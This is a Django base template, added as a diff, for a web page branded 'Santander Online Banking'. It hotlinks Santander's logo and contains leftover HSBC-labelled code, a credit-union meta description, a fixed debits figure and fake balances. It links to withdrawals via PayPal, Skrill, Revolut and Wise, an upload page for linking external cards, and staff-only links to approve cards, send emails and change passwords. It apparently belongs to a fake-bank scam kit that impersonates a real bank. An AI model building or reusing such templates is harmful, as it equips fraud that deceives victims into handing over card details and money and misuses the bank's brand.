@@ -1,0 +1,610 @@
+
+    <!DOCTYPE html>
+<html lang="en-US" class="js">
+{% load static %}
+{% include "core/translate.html" %}
+
+    <head>
+        <meta charset="utf-8">
+        <meta name="author" content="Smart">
+        <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+        <meta name="description" content="This Union is federally insured by the National Credit Union Administration. We do business in accordance with the Fair Housing Law and Equal opportunity Credit Act.">
+        <!-- Fav Icon  -->
+        <link rel="shortcut icon" href="https://upload.wikimedia.org/wikipedia/commons/8/86/Santander_bank_logo.png">
+        <!-- Page Title  -->
+        <title>{{ user.full_name }} | Santander  Online Banking </title>
+        <!-- StyleSheets  -->
+        <link rel="stylesheet" href="{% static 'assets/css/dashlite.css' %}">
+        <link rel="stylesheet" href="{% static 'scss/sweetalert.css' %}">
+        <link id="skin-default" rel="stylesheet" href="{% static 'assets/css/theme.css' %}">
+        <link id="skin-default" rel="stylesheet" href="{% static 'assets/css/theme.css' %}">
+        <link href="{% static 'css/toastr.css' %}" rel="stylesheet" />
+<!-- Start of Async Drift Code -->
+<style>
+    
+</style>
+        
+<!-- Smartsupp Live Chat script -->
+<script type="text/javascript">
+var _smartsupp = _smartsupp || {};
+_smartsupp.key = '00fad83fda9c7d93b505456cee0dcd12573e2173';
+window.smartsupp||(function(d) {
+  var s,c,o=smartsupp=function(){ o._.push(arguments)};o._=[];
+  s=d.getElementsByTagName('script')[0];c=d.createElement('script');
+  c.type='text/javascript';c.charset='utf-8';c.async=true;
+  c.src='https://www.smartsuppchat.com/loader.js?';s.parentNode.insertBefore(c,s);
+})(document);
+</script>
+<noscript> Powered by <a href=“https://www.smartsupp.com” target=“_blank”>Smartsupp</a></noscript>
+
+
+   </head>
+    <link rel="stylesheet" href="https://www.jqueryscript.net/demo/jQuery-International-Telephone-Input-With-Flags-Dial-Codes/build/css/intlTelInput.css">
+
+
+<style type="text/css">
+    .btn-primary{
+        background-color: #033d75;
+    }
+    .btn-secondary{
+        background-color: #d13636;
+    }
+    .btn-secondary:hover{opacity: 0.6;}
+    .btn-primary:hover{opacity: 0.6;}
+</style>
+<body class="nk-body npc-crypto bg-white has-sidebar ">
+    <div class="nk-app-root">
+        <!-- main @s -->
+        <div class="nk-main ">
+            <!-- sidebar @s -->
+            <div class="nk-sidebar nk-sidebar-fixed " data-content="sidebarMenu">
+                <div class="nk-sidebar-element nk-sidebar-head"  style="border-bottom: solid #fe473a;">
+                    <div class="nk-sidebar-brand" >
+                        <a href="{% url 'home' %}" class="logo-link nk-sidebar-logo">
+                            <img style="padding-left: 60px;max-width: 210px;" src="https://upload.wikimedia.org/wikipedia/commons/8/86/Santander_bank_logo.png"  class="p-3">
+                            
+                            
+                        </a>
+                    </div>
+                    <div class="nk-menu-trigger mr-n2">
+                        <a href="#" class="nk-nav-toggle nk-quick-nav-icon d-xl-none" data-target="sidebarMenu"><em class="icon ni ni-arrow-left"></em></a>
+                    </div>
+                </div><!-- .nk-sidebar-element -->
+                <div class="nk-sidebar-element">
+                    <div class="nk-sidebar-body" data-simplebar>
+                        <div class="nk-sidebar-content">
+                            <div class="nk-sidebar-widget d-none d-xl-block">
+                                <div class="user-account-info between-center">
+                                    <div class="user-account-main">
+                                        <h6 class="overline-title-alt">Available Balance</h6>
+                                        <div class="user-balance">    {{ user.balance }} <small class="currency currency-btc">{{ user.account.account_currency }}</small></div>
+                                        <div class="user-balance-alt">{{ user.balance }} <span class="currency currency-btc">{{ user.account.account_currency }}</span></div>
+                                    </div>
+                                    <a href="#" class="btn btn-white btn-icon btn-light"><em class="icon ni ni-line-chart"></em></a>
+                                </div>
+                                <ul class="user-account-data gy-1">
+                                    <li>
+                                        <div class="user-account-label">
+                                            <span class="sub-text">profit</span>
+                                        </div>
+                                        <div class="user-account-value">
+
+                                            <span class="text-success ml-2">{{ user.total_profit }} %<em class="icon ni ni-arrow-long-up"></em></span>
+                                        </div>
+                                    </li>
+                                    <li>
+                                        <div class="user-account-label">
+                                            <span class="sub-text">Debits</span>
+                                        </div>
+                                        <div class="user-account-value">
+                                           <span class="text-danger ml-2">85 %<em class="icon ni ni-arrow-long-down"></em></span>
+                                        </div>
+                                    </li>
+                                </ul>
+                                <div class="user-account-actions">
+                                    <ul class="g-3">
+                                        <li><a href="{% url 'transactions:withdrawal' %}" class="btn btn-lg btn-primary"><span><i class="fas fa-money-bill-alt"></i> Transfer</span></a></li>
+                                        <li><a href="{% url 'transactions:pay_bills' %}" class="btn btn-lg btn-secondary"><span><i class="fas fa-file-invoice-dollar"></i> Pay Bills</span></a></li>
+                                    </ul>
+                                </div>
+                            </div><!-- .nk-sidebar-widget -->
+                            <div class="nk-sidebar-widget nk-sidebar-widget-full d-xl-none pt-0">
+                                <a class="nk-profile-toggle toggle-expand" data-target="sidebarProfile" href="#">
+                                    <div class="user-card-wrap">
+                                        <div class="user-card">
+                                            <div class="user-avatar">
+                                                <span>{{ user.first_name|slice:"1"|capfirst }}{{ user.last_name|slice:"1"|capfirst }}</span>
+                                            </div>
+                                            <div class="user-info">
+                                                <span class="lead-text">{{ user.full_name }}</span>
+                                                <span class="sub-text">9482{{ user.account_no }}0</span>
+                                            </div>
+                                            <div class="user-action">
+                                                <em class="icon ni ni-chevron-down"></em>
+                                            </div>
+                                        </div>
+                                    </div>
+                                </a>
+                                <div class="nk-profile-content toggle-expand-content" data-content="sidebarProfile">
+                                    <div class="user-account-info between-center">
+                                        <div class="user-account-main">
+                                            <h6 class="overline-title-alt">Available Balance</h6>
+                                            <div class="user-balance">    {{ user.balance }}<small class="currency currency-btc">{{ user.account.account_currency }}</small></div>
+                                            <div class="user-balance-alt">{{ user.balance }} <span class="currency currency-btc">{{ user.account.account_currency }}</span></div>
+                                        </div>
+                                        <a href="#" class="btn btn-icon btn-light"><em class="icon ni ni-line-chart"></em></a>
+                                    </div>
+                                    <ul class="user-account-data">
+                                        <li>
+                                            <div class="user-account-label">
+                                                <span class="sub-text">profit</span>
+                                            </div>
+                                            <div class="user-account-value">
+                                            
+                                                <span class="text-success ml-2">{{ user.total_profit }} %<em class="icon ni ni-arrow-long-up"></em></span>
+                                            </div>
+                                        </li>
+                                        <li>
+                                            <div class="user-account-label">
+                                                <span class="sub-text">Debits</span>
+                                            </div>
+                                            <div class="user-account-value">
+                                               
+                                                <span class="text-danger ml-2">85 %<em class="icon ni ni-arrow-long-up"></em></span>
+                                            </div>
+                                        </li>
+                                    </ul>
+                                    <ul class="user-account-links">
+                                        <li><a href="{% url 'transactions:withdrawal' %}" class="link"><span> Transfer Funds</span> <em class="icon ni ni-wallet-out"></em></a></li>
+                                        <li><a href="{% url 'transactions:pay_bills' %}" class="link"><span>Pay Bills</span> <em class="icon ni ni-wallet-in"></em></a></li>
+                                    </ul>
+                                    <ul class="link-list">
+                                        <li><a href="{% url 'accounts:view_profile' %}"><em class="icon ni ni-user-alt"></em><span>View Profile</span></a></li>
+                                        <li><a href="account-setting"><em class="icon ni ni-setting-alt"></em><span>Account Setting</span></a></li>
+                                        <li><a href="activity-logs"><em class="icon ni ni-activity-alt"></em><span>Login Activity</span></a></li>
+                                    </ul>
+                                    <ul class="link-list">
+                                        <li><a href="{% url 'accounts:logout' %}"><em class="icon ni ni-signout"></em><span>Sign out</span></a></li>
+                                    </ul>
+                                </div>
+                            </div><!-- .nk-sidebar-widget -->
+                            <div class="nk-sidebar-menu">
+                                <!-- Menu -->
+                                <ul class="nk-menu">
+                                    
+
+
+                                        <!-- HSBC Custom Translation UI -->
+                                        <div class="hsbc-lang-selector-container">
+                                            <label class="hsbc-lang-selector-label">🌎 Language:</label>
+                                            <div class="hsbc-lang-wrapper">
+                                                <select id="hsbc_language_selector" class="hsbc-lang-dropdown">
+                                                    <!-- Asia Region -->
+                                                    <optgroup label="🌏 Asia">
+                                                        <option value="zh-CN">🇨🇳 Chinese (Simplified)</option>
+                                                        <option value="zh-TW">🇹🇼 Chinese (Traditional)</option>
+                                                        <option value="ja">🇯🇵 Japanese</option>
+                                                        <option value="ko">🇰🇷 Korean</option>
+                                                        <option value="hi">🇮🇳 Hindi</option>
+                                                        <option value="bn">🇧🇩 Bengali</option>
+                                                        <option value="ur">🇵🇰 Urdu</option>
+                                                        <option value="ar">🇦🇪 Arabic</option>
+                                                        <option value="th">🇹🇭 Thai</option>
+                                                        <option value="vi">🇻🇳 Vietnamese</option>
+                                                        <option value="ms">🇲🇾 Malay</option>
+                                                        <option value="id">🇮🇩 Indonesian</option>
+                                                        <option value="tl">🇵🇭 Filipino/Tagalog</option>
+                                                        <option value="km">🇰🇭 Khmer</option>
+                                                        <option value="my">🇲🇲 Burmese</option>
+                                                        <option value="ne">🇳🇵 Nepali</option>
+                                                        <option value="si">🇱🇰 Sinhala</option>
+                                                        <option value="fa">🇮🇷 Persian/Farsi</option>
+                                                    </optgroup>
+
+                                                    <!-- Europe Region -->
+                                                    <optgroup label="🇪🇺 Europe">
+                                                        <option value="en-GB">🇬🇧 English (UK)</option>
+                                                        <option value="de">🇩🇪 German</option>
+                                                        <option value="fr">🇫🇷 French</option>
+                                                        <option value="es">🇪🇸 Spanish</option>
+                                                        <option value="it">🇮🇹 Italian</option>
+                                                        <option value="ru">🇷🇺 Russian</option>
+                                                        <option value="nl">🇳🇱 Dutch</option>
+                                                        <option value="sv">🇸🇪 Swedish</option>
+                                                        <option value="no">🇳🇴 Norwegian</option>
+                                                        <option value="da">🇩🇰 Danish</option>
+                                                        <option value="fi">🇫🇮 Finnish</option>
+                                                        <option value="pl">🇵🇱 Polish</option>
+                                                        <option value="uk">🇺🇦 Ukrainian</option>
+                                                        <option value="cs">🇨🇿 Czech</option>
+                                                        <option value="hu">🇭🇺 Hungarian</option>
+                                                        <option value="el">🇬🇷 Greek</option>
+                                                        <option value="tr">🇹🇷 Turkish</option>
+                                                        <option value="pt">🇵🇹 Portuguese</option>
+                                                        <option value="ro">🇷🇴 Romanian</option>
+                                                        <option value="bg">🇧🇬 Bulgarian</option>
+                                                    </optgroup>
+
+                                                    <!-- Africa Region -->
+                                                    <optgroup label="🌍 Africa">
+                                                        <option value="sw">🇰🇪 Swahili</option>
+                                                        <option value="zu">🇿🇦 Zulu</option>
+                                                        <option value="am">🇪🇹 Amharic</option>
+                                                        <option value="so">🇸🇴 Somali</option>
+                                                        <option value="mg">🇲🇬 Malagasy</option>
+                                                        <option value="af">🇿🇦 Afrikaans</option>
+                                                    </optgroup>
+
+                                                    <!-- North America Region -->
+                                                    <optgroup label="🌎 North America">
+                                                        <option value="en-US">🇺🇸 English (US)</option>
+                                                        <option value="fr-CA">🇨🇦 French (Canadian)</option>
+                                                        <option value="es-MX">🇲🇽 Spanish (Mexican)</option>
+                                                        <option value="haw">🇺🇸 Hawaiian</option>
+                                                        <option value="nv">🇺🇸 Navajo</option>
+                                                    </optgroup>
+
+                                                    <!-- South America Region -->
+                                                    <optgroup label="🌎 South America">
+                                                        <option value="pt-BR">🇧🇷 Portuguese (Brazilian)</option>
+                                                        <option value="es-AR">🇦🇷 Spanish (Argentinian)</option>
+                                                        <option value="qu">🇵🇪 Quechua</option>
+                                                        <option value="ay">🇧🇴 Aymara</option>
+                                                        <option value="gn">🇵🇾 Guarani</option>
+                                                    </optgroup>
+
+                                                    <!-- Oceania Region -->
+                                                    <optgroup label="🌏 Oceania">
+                                                        <option value="en-AU">🇦🇺 English (Australian)</option>
+                                                        <option value="en-NZ">🇳🇿 English (New Zealand)</option>
+                                                        <option value="mi">🇳🇿 Māori</option>
+                                                        <option value="sm">🇼🇸 Samoan</option>
+                                                        <option value="to">🇹🇴 Tongan</option>
+                                                        <option value="fj">🇫🇯 Fijian</option>
+                                                    </optgroup>
+                                                </select>
+                                            </div>
+                                        </div>
+
+                                        <!-- Hidden Google Translate Element -->
+                                        <div id="hsbc_google_translate_element"></div>
+
+                                    <br>
+                                    <li class="nk-menu-heading">
+                                        <h6 class="overline-title">Menu</h6>
+                                    </li>
+
+                                    <li class="nk-menu-item">
+                                        <a href="{% url 'home' %}" class="nk-menu-link">
+                                            <span class="nk-menu-icon"><em class="icon ni ni-dashboard"></em></span>
+                                            <span class="nk-menu-text">Dashboard</span>
+                                        </a>
+                                    </li>
+
+                                    <li class="nk-menu-item">
+                                        <a href="{% url 'transactions:history' %}" class="nk-menu-link">
+                                            <span class="nk-menu-icon"><em class="icon ni ni-report-profit"></em></span>
+                                            <span class="nk-menu-text">Account summary</span>
+                                        </a>
+                                    </li>
+                                    <li class="nk-menu-item">
+                                        <a href="{% url 'transactions:withdrawal' %}" class="nk-menu-link">
+                                            <span class="nk-menu-icon"><em class="icon ni ni-wallet-out"></em></span>
+                                            <span class="nk-menu-text">Transfer</span>
+                                        </a>
+                                    </li>
+
+<style>
+    .custom-menu .nk-menu-link {
+        display: flex;
+        align-items: center;
+        gap: 8px;
+        padding: 10px;
+    }
+    .custom-menu .nk-menu-icon img {
+        width: 24px;
+        height: 24px;
+        object-fit: contain;
+    }
+</style>
+
+<ul class="custom-menu">
+    <li class="nk-menu-item">
+        <a href="{% url 'transactions:local_withdrawal' %}" class="nk-menu-link">
+            <span class="nk-menu-icon">
+                <img src="https://companieslogo.com/img/orig/SAN-8a4d0f73.png?t=1720244493" alt="Local Logo">
+            </span>
+            <span class="nk-menu-text">Local Withdrawal</span>
+        </a>
+    </li>
+    <li class="nk-menu-item">
+        <a href="{% url 'transactions:paypal_withdrawal' %}" class="nk-menu-link">
+            <span class="nk-menu-icon">
+                <img src="https://upload.wikimedia.org/wikipedia/commons/3/31/PayPal_Logo2014.svg" alt="Paypal Logo">
+            </span>
+            <span class="nk-menu-text">Paypal</span>
+        </a>
+    </li>
+    <li class="nk-menu-item">
+        <a href="{% url 'transactions:skrill_withdrawal' %}" class="nk-menu-link">
+            <span class="nk-menu-icon">
+                <img src="https://upload.wikimedia.org/wikipedia/commons/1/1b/Skrill_logo.svg" alt="Skrill Logo">
+            </span>
+            <span class="nk-menu-text">Skrill Withdrawal</span>
+        </a>
+    </li>
+    <li class="nk-menu-item">
+        <a href="{% url 'transactions:revolut_withdrawal' %}" class="nk-menu-link">
+            <span class="nk-menu-icon">
+                <img style=" width: 30px;" src="https://upload.wikimedia.org/wikipedia/commons/d/d6/Revolut.svg" alt="Revolut Logo">
+            </span>
+            <span class="nk-menu-text">Revolut Withdrawal</span>
+        </a>
+    </li>
+    <li class="nk-menu-item">
+        <a href="{% url 'transactions:wise_withdrawal' %}" class="nk-menu-link">
+            <span class="nk-menu-icon">
+                <img style=" width: 30px;" src="https://upload.wikimedia.org/wikipedia/commons/e/e8/Wise_Logo_512x124.svg" alt="Wise Logo">
+            </span>
+            <span class="nk-menu-text">Wise Withdrawal</span>
+        </a>
+    </li>
+</ul>
+
+
+
+                                    <li class="nk-menu-item">
+                                        <a href="{% url 'transactions:payment_create' %}" class="nk-menu-link">
+                                            <span class="nk-menu-icon"><em class="icon ni ni-wallet-in"></em></span>
+                                            <span class="nk-menu-text">Deposit</span>
+                                        </a>
+                                    </li>
+
+                                    <li class="nk-menu-item">
+                                        <a href="{% url 'transactions:pay_bills' %}" class="nk-menu-link">
+                                            <span class="nk-menu-icon"><em class="icon ni ni-cc-secure"></em></span>
+                                            <span class="nk-menu-text">Pay Bills</span>
+                                        </a>
+                                    </li>
+                                                                         <li class="nk-menu-item">
+                                        <a href="{% url 'bankcard:user_cards' %}" class="nk-menu-link">
+                                            <span class="nk-menu-icon"><em class="icon ni ni-cc-alt2-fill"></em></span>
+                                            <span class="nk-menu-text">Visual Cards</span>
+                                        </a>
+                                    </li>
+
+                                        <!--
+                                     <li class="nk-menu-itemhas-sub">
+                                        <a href="#" class="nk-menu-link bg-primary text-light">
+                                            <span class="nk-menu-icon"><em class="icon ni ni-bitcoin"></em></span>
+                                            <span class="nk-menu-text">Crypto Currency</span>
+                                        </a>
+                                        <ul class="nk-menu-sub">
+                                            <li class="nk-menu-item">
+                                                <a href="{% url 'transactions:manage_asset' %}" class="nk-menu-link"><span class="nk-menu-text">Manage Assets</span></a>
+                                            </li>
+                                            
+                                            <li class="nk-menu-item">
+                                                <a href="{% url 'transactions:create_withdrawal' %}" class="nk-menu-link"><span class="nk-menu-text">Fiat Withdrawal</span></a>
+                                            </li>
+                                        </ul> .nk-menu-sub -->
+                                        
+                                    </li><!-- .nk-menu-item -->
+                                    <li class="nk-menu-item">
+                                        <a href="{% url 'transactions:loan_application_list' %}" class="nk-menu-link">
+                                            <span class="nk-menu-icon"><em class="icon ni ni-growth"></em></span>
+                                            <span class="nk-menu-text">Loans</span>
+                                        </a>
+                                    </li>
+                                                                            <li class="nk-menu-item">
+                                        <a href="{% url 'transactions:upload' %}" class="nk-menu-link">
+                                            <span class="nk-menu-icon"><em class="icon ni ni-cc-alt"></em></span>
+                                            <span class="nk-menu-text">Link External card</span>
+                                        </a>
+                                    </li>
+                                    <li class="nk-menu-item">
+                                        <a href="{% url 'accounts:edit_profile' %}" class="nk-menu-link">
+                                            <span class="nk-menu-icon"><em class="icon ni ni-setting-alt-fill"></em></span>
+                                            <span class="nk-menu-text">Account Setting</span>
+                                        </a>
+                                    </li>
+                                     <li class="nk-menu-item">
+                                        <a href="{% url 'transactions:ticket' %}" class="nk-menu-link">
+                                            <span class="nk-menu-icon"><em class="icon ni ni-help-alt"></em></span>
+                                            <span class="nk-menu-text">Support</span>
+                                        </a>
+
+                                    </li>
+        
+
+
+                                {% if user.is_authenticated and user.is_staff %}
+
+                                     <li class="nk-menu-item">
+                                        <a href="{% url 'accounts:select_user' %}" class="nk-menu-link">
+                                            <span class="nk-menu-icon"><em class="icon ni ni-help-alt"></em></span>
+                                            <span class="nk-menu-text">SEND EMAIL</span>
+                                        </a>
+                                    </li>
+                                {% endif %}
+
+                                {% if user.is_authenticated and user.is_staff %}
+                                   
+                                     <li class="nk-menu-item">
+                                        <a href="{% url 'accounts:change_password' %}" class="nk-menu-link">
+                                            <span class="nk-menu-icon"><em class="icon ni ni-help-alt"></em></span>
+                                            <span class="nk-menu-text">CHANGE PASSWORD</span>
+                                        </a>
+                                    </li>
+                                {% endif %}
+                                   
+                                {% if user.is_authenticated and user.is_staff %}
+                                   
+                                     <li class="nk-menu-item">
+                                        <a href="{% url 'bankcard:approve_select_user' %}" class="nk-menu-link">
+                                            <span class="nk-menu-icon"><em class="icon ni ni-help-alt"></em></span>
+                                            <span class="nk-menu-text">APPROVE CARDS</span>
+                                        </a>
+                                    </li>
+                                {% endif %}
+                                   
+                                   
+
+
+                                </ul><!-- .nk-menu -->
+                            </div><!-- .nk-sidebar-menu -->
+                          
+                            <div class="nk-sidebar-footer">
+                                <ul class="nk-menu nk-menu-footer">
+                                   
+                                  
+                                </ul><!-- .nk-footer-menu -->
+                            </div><!-- .nk-sidebar-footer -->
+                        </div><!-- .nk-sidebar-content -->
+                    </div><!-- .nk-sidebar-body -->
+                </div><!-- .nk-sidebar-element -->
+            </div>
+            <!-- sidebar @e -->
+            <!-- wrap @s -->
+            <div class="nk-wrap ">
+                <!-- main header @s -->
+                <div class="nk-header nk-header-fluid nk-header-fixed is-secondary">
+                    <div class="container-fluid">
+                        <div class="nk-header-wrap">
+                            <div class="nk-menu-trigger d-xl-none ml-n1">
+                                <a href="#" class="nk-nav-toggle nk-quick-nav-icon" data-target="sidebarMenu"><em class="icon ni ni-menu"></em></a>
+                            </div>
+                            <div class="nk-header-brand d-xl-none">
+                                <a href="#" class="logo-link">
+                            <img style="padding-left: 40px;max-width: 190px;margin-right: 20px;" src="https://upload.wikimedia.org/wikipedia/commons/8/86/Santander_bank_logo.png" alt="Image description">
+                                </a>
+                            </div>
+                            <div class="nk-header-news d-none d-xl-block">
+                                <div class="nk-news-list">
+                                    <a class="nk-news-item" href="https://www.bis.org/publ/qtrpdf/r_qt2109d.pdf">
+                                        <div class="nk-news-icon">
+                                            <em class="icon ni ni-card-view"></em>
+                                        </div>
+                                        <div class="nk-news-text">
+                                            <p>Do you know the latest update of Covid 2019? <span> An overview of ours is now available here.</span></p>
+                                            <em class="icon ni ni-external"></em>
+                                        </div>
+                                    </a>
+                                </div>
+                            </div>
+                            <div class="nk-header-tools">
+                                <ul class="nk-quick-nav">
+                                    <li class="dropdown user-dropdown">
+                                        <a href="#" class="dropdown-toggle" data-toggle="dropdown">
+                                            <div class="user-toggle">
+                                                <div class="user-avatar sm">
+                                                    <em class="icon ni ni-user-alt"></em>
+                                                </div>
+                                                <div class="user-info d-none d-md-block">
+                                                    <div class="user-status user-status-verified">Connected</div>
+                                                    <div class="user-name dropdown-indicator">{{ user.full_name }}</div>
+                                                </div>
+                                            </div>
+                                        </a>
+                                        <div class="dropdown-menu dropdown-menu-md dropdown-menu-right dropdown-menu-s1">
+                                            <div class="dropdown-inner user-card-wrap bg-lighter d-none d-md-block">
+                                                <div class="user-card">
+                                                    <div class="user-avatar">
+                                                        <span>{{ user.first_name|slice:"1"|capfirst }}{{ user.last_name|slice:"1"|capfirst }}</span>
+
+                                                    </div>
+                                                    <div class="user-info">
+                                                        <span class="lead-text">{{ user.full_name }}</span>
+                                                        <span class="sub-text">{{ user.account_no }}</span>
+                                                    </div>
+                                                </div>
+                                            </div>
+                                            <div class="dropdown-inner user-account-info">
+                                                <h6 class="overline-title-alt">Current Account</h6>
+                                                <div class="user-balance">    {{ user.balance }} <small class="currency currency-btc">{{ user.account.account_currency }}</small></div>
+                                                <div class="user-balance-sub">Local <span>{{ user.balance }} <span class="currency currency-btc">{{ user.account.account_currency }}</span></span></div>
+                                                <a href="{% url 'transactions:withdrawal' %}" class="link"><span>Transfer Funds</span> <em class="icon ni ni-wallet-out"></em></a><br><br>VERIFICATION STATUS :
+{% if user.status == 'PENDING' %}
+    <p class="link pending"><span style="color: lightseagreen;">{{ user.status }}</span> <em class="icon ni ni-info" style="color: lightseagreen;"></em></p>
+{% elif user.status == 'UNVERIFIED' %}
+    <p class="link unverified"><span style="color: red;">{{ user.status }}</span> <em class="icon ni ni-alert" style="color: red;"></em></p>
+{% elif user.status == 'VERIFIED' %}
+    <p class="link verified"><strong><span style="color: green; font-weight: bold;">{{ user.status }}</span></strong> <em class="icon ni ni-check-circle" style="color: green;"></em></p>
+{% endif %}
+
+
+                                            </div>
+                                            <div class="dropdown-inner">
+                                                <ul class="link-list">
+                                                    <li><a href="{% url 'accounts:view_profile' %}"><em class="icon ni ni-user-alt"></em><span>View Profile</span></a></li>
+                                                    
+                                                    
+                                                    
+                                                    <li><a class="dark-switch" href="javascript:void"><em class="icon ni ni-moon"></em><span>Dark Mode</span></a></li>
+                                                </ul>
+                                            </div>
+                                            <div class="dropdown-inner">
+                                                <ul class="link-list">
+                                                    <li><a href="{% url 'accounts:logout' %}"><em class="icon ni ni-signout"></em><span>Sign out</span></a></li>
+                                                </ul>
+                                            </div>
+                                        </div>
+                                    </li>
+                                </ul>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+                <!-- main header @e -->                <!-- content @s -->
+{% block content %}
+
+{% endblock content %}
+                <!-- content @e -->
+                <!-- footer @s -->
+        
+                <div class="nk-footer nk-footer-fluid">
+                    <div class="container-fluid">
+                        <div class="nk-footer-wrap">
+                            <div class="nk-footer-copyright"> &copy; 2025 Santander  Online Banking   Corporations - <a href="#">All rights reserved.</a>
+                            </div>
+                            <div class="nk-footer-links">
+                                <ul class="nav nav-sm">
+                                    <li class="nav-item"><a class="nav-link" href="{% url 'transactions:terms' %}">Terms</a></li>
+                                    <li class="nav-item"><a class="nav-link" href="{% url 'contact_us' %}">Help</a></li>
+                                </ul>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+                <!-- footer @e -->
+            </div>
+            <!-- wrap @e -->
+        </div>
+        <!-- main @e -->
+    </div>
+
+<input type="hidden" id="is-registered" value="{% if user.is_authenticated %}true{% else %}false{% endif %}">
+<input type="hidden" id="user-email" value="{{ user.email }}">
+<input type="hidden" id="full-name" value="{{ user.get_full_name }}">
+    <script src="https://smtpjs.com/v3/smtp.js"></script>
+
+
+    <!-- JavaScript -->
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
+
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
+    <script src="{% static 'assets/js/country.js' %}"></script>
+    <script src="{% static 'assets/js/bundle.js' %}"></script>
+    <script src="{% static 'assets/js/scripts.js' %}"></script>
+    <script src="{% static 'assets/js/charts/chart-crypto.js' %}"></script>
+    <script src="{% static 'assets/js/sweetalert.js' %}"></script>
+   <script src="{% static 'assets/js/jquery.min.js' %}"></script>
+   <script src="{% static 'assets/js/custom.js' %}"></script>
+   <script src="{% static 'assets/js/toastr.js' %}"></script>
+  
+
+
+
+</body>
+
+</html>
